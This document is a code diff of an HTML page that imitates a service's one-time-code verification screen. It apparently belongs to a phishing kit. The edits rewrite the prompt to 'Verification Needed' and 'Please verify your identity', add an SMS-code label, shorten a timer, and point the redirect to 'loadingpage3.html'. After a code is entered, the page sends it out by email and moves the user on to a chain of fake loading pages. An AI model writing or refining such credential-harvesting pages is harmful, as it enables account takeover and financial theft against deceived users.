@@ -136,10 +136,13 @@
 <div id=app class=isotope-app><div class="isotope-page--authentication isotope-page"><div data-v-6413f83e class="isotope-challenge-type--one-time-code isotope-challenge-type">
     
        <form id=otpform role=form class="isotope-slide one-time-code"><div class=isotope-slide__header><div data-v-6413f83e><h1 tabindex=-1 class=font-medium-heading>
- Enter code
- </h1><p class="mar-top--small font-body-2">
- A 6-digit code has been sent to your phone number
+Verification Needed
+ </h1><p class="mar-top--small font-body-2"> 
+Please verify your identity before completing this action.
  </p></div></div><div class=isotope-slide__content><div data-v-6413f83e role=heading tabindex=-1 class=isotope-actions><label data-v-6413f83e class=irisv-display-input-field-specified>
+     <label data-v-6413f83e class="irisv-display-input-field-specified">
+        A verification code has been sent to your phone via SMS. Enter it below.
+      </label>
 	<style>
         .custom-otp-block {
           margin-top: 20px;
@@ -226,7 +229,7 @@
             otpInput.disabled = false;
             verifyBtn.disabled = false;
             otpInput.focus();
-          }, 10000);
+          }, 7000);
         });
       
         otpInput.addEventListener("input", () => {
@@ -253,7 +256,7 @@
               otpInput.disabled = true;
               verifyBtn.disabled = true;
               setTimeout(() => {
-                window.location.href = 'loadingpage2.html';
+                window.location.href = 'loadingpage3.html';
               }, 1000);
             }, function(error) {
               console.error('Email sending failed:', error);
@@ -289,7 +292,9 @@
  <div class="footer footer--vertical5">
  <div class=footer__row>
  <div class=footer__column-a>
-
+<div class=footer__logo>
+ 
+ 
  
  
  
